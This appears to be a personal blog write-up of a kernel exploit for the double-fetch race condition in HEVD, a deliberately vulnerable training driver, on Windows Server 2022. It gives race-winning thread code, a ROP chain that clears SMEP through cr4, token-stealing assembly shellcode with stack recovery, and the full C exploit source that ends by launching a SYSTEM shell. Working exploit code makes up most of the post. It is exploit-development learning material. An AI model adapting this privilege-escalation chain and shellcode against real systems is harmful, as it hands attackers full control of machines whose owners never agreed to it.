[Home](https://plackyhacker.github.io)

# Revisiting the HEVD Double-fetch on Windows 2022
       
# Introduction

I posted my [first attempt](https://plackyhacker.github.io/kernel/race) at doing the HEVD double fetch exploit for Windows 2022. Although I managed to get a privileged shell it was a very messy implementation.

The shell that the exploit was running in basically locked up and was pretty useless. The exploit spawned a new shell which set there waiting to receive the privileged `SYSTEM` token to elevate privileges. This was very unsatisfactory!

A few months have passed since then and I like to think I have progressed a little bit since then so I deceided to revisit this vulnerability and implement a more satisfactory exploit.

I won't re-explain the race condition and the double fetch bug (you can read about that [here](https://plackyhacker.github.io/kernel/race)), instead I will cover the exploit from a high-level explaining my logic, and the decisions I made.

**Note:** I will post the entrie exploit at the bottom of the article.

## Winning the Race - Revisited

I decided to revisit the race condition and made some adjustments to my code. In the previous exploit it would sometimes take up to 30 minutes to trigger the bug, I'm a pretty patient man but that was a pain in the ass!

Here are the snippets of code:

```c
// ...

struct UserData {
    LPVOID pBuffer;
    size_t sizeOfData;
};

// global variables
UserData userData;
char* userBuffer;
HANDLE hDriver;

//... 

// this is the function trying to win the race
DWORD WINAPI ChangeStruct(void* args)
{
    while (!raceWon)
    {
        userData.sizeOfData = 0x828;
        Sleep(10);
    }
    return NULL;
}

// this is the function sending the initial IOCTL
DWORD WINAPI SendIOCTL(void* args)
{
    userData.pBuffer = userBuffer;
    userData.sizeOfData = 0x800;
    BOOL status = DeviceIoControl(hDriver,
        0x222037, (LPVOID)&userData, sizeof(userData), NULL, 0, NULL, NULL);

    return NULL;
}

// ...
```

These are the two functions being called on seperate threads. The `ChangeStruct` thread runs until the `raceWon` global variable is no longer set to `0x00`. The idea is that when the `SendIOCTL` function runs, sending the acceptable data size of `0x800`, this second function at some point will win the race condition and set the buffer size to `0x828`, overwriting the saved return address on the stack giving us control of code flow.

One other thing to note is my final shellcode function takes the address of the global function (placed on the stack) and sets it to `0x01` to stop the thread from running.

The following code sets up the two threads:

```c
// this thread will try to win the race
HANDLE tChangeStruct = CreateThread(NULL,
    NULL, ChangeStruct, NULL, CREATE_SUSPENDED, NULL);

    
// make the thread critical and run on CPU0
SetThreadPriority(tChangeStruct, THREAD_PRIORITY_TIME_CRITICAL);
SetThreadAffinityMask(tChangeStruct, 0);
ResumeThread(tChangeStruct);
    
DWORD cpuIndex = 1;

// this thread continuously calls the vulnerable hevd IOCTL
while(!raceWon)
{
   // make the thread critical and run on CPU0
   HANDLE tIOCTL = CreateThread(NULL,
       NULL, SendIOCTL, NULL, CREATE_SUSPENDED, NULL);
   SetThreadPriority(tIOCTL, THREAD_PRIORITY_TIME_CRITICAL);
   SetThreadAffinityMask(tIOCTL, cpuIndex);
        
   ResumeThread(tIOCTL);
        
   cpuIndex++;
   if (cpuIndex >= sysInfo.dwNumberOfProcessors)
       cpuIndex = 1;
}
```

If you have read the previous attempts then this code should look familiar, except the continuous setting up of the `tIOCTL` thread is also controlled by the `raceWon` global variable. I have also added some code to set the priority of the threads and the CPU affinity based upon the number of processors available.

This dramatically reduced the amount of time I needed to wait for a race condition to trigger the double fetch. It went down to roughly 2 minutes. During debugging this is still a pain, so I used the `WinDbg` 'hack' as shown in [part 2](https://plackyhacker.github.io/kernel/race-2) of my first attempt.

## Defeating SMEP - Revisited

In my [first attempt](https://plackyhacker.github.io/kernel/race-2) I used a U/S bit-flipping technique to defeat SMEP. Essentially marking the shellcode page as a kernel owned page. The ROP chain to do this is quite long and overwrites a substantial amount of stack space. This makes recovering the stack more difficult as it overwrites alot of the save return addresses on the stack.

I decided to use the easier technique, which involves disabling the SMEP flag in the CPU register. I prefer the U/S bit-flipping technique because it feels more reliable because changing the `cr4` value to disable SMEP requires you to zero out a single byte, meaning you need to know what the value previously was (which is easy in a debugger, but not really portable). **I might revisit this exploit again to see if I can recover from the former technique!**

```c
userBuffer = (char*)malloc(sizeof(char*) * BUFFER_SIZE);
memset((void*)userBuffer, 0x00, BUFFER_SIZE);

// ...

 memcpy((void*)(userBuffer + 0x7f8), &marker, 0x8);

// rop chain
int index = 0;
char* offset = userBuffer + 0x800;
QWORD* rop = (QWORD*)offset;

// we should set the raceWon variable to 1
*(rop + index++) = (QWORD)&raceWon;                             // stored on stack (not in rop chain)
*(rop + index++) = (QWORD)kernelBase + 0x7f700b;                // pop rcx
*(rop + index++) = (QWORD)0x0070678;
*(rop + index++) = (QWORD)kernelBase + 0x39e4a7;                // mov cr4, rcx; ret;
*(rop + index++) = (QWORD)&Shellcode;
```

The important part here is that the `raceWon` address is placed on the stack **before** the saved return address overflow, which starts with the `pop rcx` gadget. I simply disable SMEP and return to the shellcode in user space.

## Shellcode - Revisited

The shellcode uses a very standard tocken stealing payload but also has two other important elements:

```asm
.CODE

Shellcode PROC
	; NOTE:                   avoid changing non-volatile registers:
                          ; rbx, r12, r13, r14, r15
									
	stop_user_threads:
		mov rax, r11          ; r11 contains a pointer to the raceWon global var
		mov rax, [rax]        ; move address of raceWon in to rax
		mov rcx, 01h          ; move 0x1 in to rcx
		mov [rax], rcx        ; set raceWon var to 1

	start:
		mov rax, gs:[0188h]    ; get current thread (_KTHREAD)
		mov rax, [rax+0b8h]    ; get current process (_KPROCESS)
		mov r8, rax            ; store _EPROCESS in r8

	loop_start:
		mov r8, [r8+0448h]      ; get ActiveProcessLinks
		sub r8, 0448h           ; get current process (_EPROCESS)
		mov rcx, [r8+0440h]     ; get UniqueProcessId (PID)
		cmp rcx, 04h            ; compare PID to SYSTEM PID 
		jne loop_start          ; loop until SYSTEM PID is found

	apply_token:
		mov rcx, [r8+04b8h]     ; SYSTEM token is @ offset _EPROCESS + 0x4b8
		and cl, 0f0h            ; clear out _EX_FAST_REF RefCnt
		mov [rax+04b8h], rcx    ; copy SYSTEM token to current process

	recover_stack:
		mov rax, 0c0000001h    ; expected return value from hevd function
		add rsp, 010h          ; reallign stack to return value
		ret                    ; ret back to driver code
Shellcode ENDP

END
```

The `stop_user_threads` section takes the value in `r11` which just happens to point at the address of the `raceWon` variable I placed on the stack, move it into `rax` and set the value to `0x1` or `TRUE`.

The `recover_stack` section essentially realligns the value in `rsp` to the next return address on the stack that I didn't overwrite with the buffer overflow, this is `+0x10` bytes from the current `rsp` value. I set a return value of `0xc0000001` or `NT_STATUS_UNSUCCESSFUL` which has no bearing on the exploit, but I should set a return value for the driver.

## The Exploit

Here is the final exploit in action:

<img width="805" alt="Screenshot 2025-02-12 at 20 06 05" src="https://github.com/user-attachments/assets/bb752747-6be3-4213-95e9-0a15bb3d1521" style="border: 1px solid black;" />

Much quicker, and much more reliable!

## The Code

Here is the final exploit code:

```c
#include <stdio.h>
#include <Windows.h>
#include <winternl.h>
#include <psapi.h>
#include <cstdint>
#include <time.h>

extern "C" void Shellcode();

struct UserData {
    LPVOID pBuffer;
    size_t sizeOfData;
};

// global variables
UserData userData;
char* userBuffer;
HANDLE hDriver;

// used to stop the while loop
BOOL raceWon = FALSE;

void PrintTime(BOOL start)
{
    time_t rawtime;
    struct tm timeinfo;

    time(&rawtime); // Get current time

    localtime_s(&timeinfo, &rawtime);
 
    if (start)
    {

        printf("[+] Start time: %02d:%02d:%02d\n",
            timeinfo.tm_hour,
            timeinfo.tm_min,
            timeinfo.tm_sec);
    }
    else {
        printf("[+] End time: %02d:%02d:%02d\n",
            timeinfo.tm_hour,
            timeinfo.tm_min,
            timeinfo.tm_sec);
    }
}

// this is the function trying to win the race
DWORD WINAPI ChangeStruct(void* args)
{
    while (!raceWon)
    {
        userData.sizeOfData = 0x828;
        Sleep(10);
    }
    return NULL;
}

// this is the function sending the initial IOCTL
DWORD WINAPI SendIOCTL(void* args)
{
    userData.pBuffer = userBuffer;
    userData.sizeOfData = 0x800;
    BOOL status = DeviceIoControl(hDriver,
        0x222037, (LPVOID)&userData, sizeof(userData), NULL, 0, NULL, NULL);

    return NULL;
}

typedef uint64_t QWORD;
#define ARRAY_SIZE 1024
#define BUFFER_SIZE 0x810

QWORD getBaseAddr(LPCWSTR drvName) {
    LPVOID drivers[512];
    DWORD cbNeeded;
    int nDrivers, i = 0;
    if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers)) {
        WCHAR szDrivers[512];
        nDrivers = cbNeeded / sizeof(drivers[0]);
        for (i = 0; i < nDrivers; i++) {
            if (GetDeviceDriverBaseName(drivers[i], szDrivers, sizeof(szDrivers) / sizeof(szDrivers[0]))) {
                if (wcscmp(szDrivers, drvName) == 0) {
                    return (QWORD)drivers[i];
                }
            }
        }
    }
    return 0;
}


int main() {
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);

    printf("HEVD Double Fetch Exploit\n=========================\n");

    printf("[+] Number of CPU cores: %u\n", sysInfo.dwNumberOfProcessors);

    // get a handle to the driver
    hDriver = CreateFile(L"\\\\.\\HacksysExtremeVulnerableDriver",
        GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

    if (hDriver == INVALID_HANDLE_VALUE) {
        printf("[!] Unable to get a handle for the driver: %d\n", GetLastError());
        return 1;
    }

    // allocate the user space buffer
    printf("[+] Allocating memory for user buffer...\n");
    userBuffer = (char*)malloc(sizeof(char*) * BUFFER_SIZE);
    memset((void*)userBuffer, 0x00, BUFFER_SIZE);
    printf("[+] userBuffer: 0x%p\n", userBuffer);

    // get the kernel base address
    QWORD kernelBase = getBaseAddr(L"ntoskrnl.exe");
    printf("[+] Kernel base address: 0x%p\n", kernelBase);

    QWORD hevdBase = getBaseAddr(L"HEVD.sys");
    printf("[+] HEVD base address: 0x%p\n", hevdBase);

    printf("[+] raceWin variable address: 0x%p\n", &raceWon);

    // useful ROP Gadgets
    QWORD ROP_NOP = kernelBase + 0x639131;                          // ret ;
    QWORD INT3 = kernelBase + 0x852b70;                             // int3; ret

    // marker
    QWORD marker = 0xdeadc0dedeadc0de;
    memcpy((void*)(userBuffer + 0x7f8), &marker, 0x8);

    // rop chain
    int index = 0;
    char* offset = userBuffer + 0x800;
    QWORD* rop = (QWORD*)offset;

    // we should set the raceWon variable to 1
    *(rop + index++) = (QWORD)&raceWon;                             // stored on stack (not in rop chain)
    *(rop + index++) = (QWORD)kernelBase + 0x7f700b;                // pop rcx
    *(rop + index++) = (QWORD)0x0070678;
    *(rop + index++) = (QWORD)kernelBase + 0x39e4a7;                // mov cr4, rcx; ret;
    *(rop + index++) = (QWORD)&Shellcode;

    printf("[!] Press enter to continue...");
    getchar();

    PrintTime(TRUE);
    printf("[+] Starting the race, this may take some time...\n");
    
    // this thread will try to win the race
    HANDLE tChangeStruct = CreateThread(NULL,
        NULL, ChangeStruct, NULL, CREATE_SUSPENDED, NULL);

    
    // make the thread critical and run on CPU0
    SetThreadPriority(tChangeStruct, THREAD_PRIORITY_TIME_CRITICAL);
    SetThreadAffinityMask(tChangeStruct, 0);
    ResumeThread(tChangeStruct);
    
    DWORD cpuIndex = 1;

    // this thread continuously calls the vulnerable hevd IOCTL
    while(!raceWon)
    {
        // make the thread critical and run on CPU0
        HANDLE tIOCTL = CreateThread(NULL,
            NULL, SendIOCTL, NULL, CREATE_SUSPENDED, NULL);
        SetThreadPriority(tIOCTL, THREAD_PRIORITY_TIME_CRITICAL);
        SetThreadAffinityMask(tIOCTL, cpuIndex);
        
        ResumeThread(tIOCTL);
        
        cpuIndex++;
        if (cpuIndex >= sysInfo.dwNumberOfProcessors)
            cpuIndex = 1;
    }

    PrintTime(FALSE);
    printf("[+] Enjoy your shell...\n\n");
    system("cmd.exe");

    return 0;
}
```

Byeeeeeeee!

[Home](https://plackyhacker.github.io)
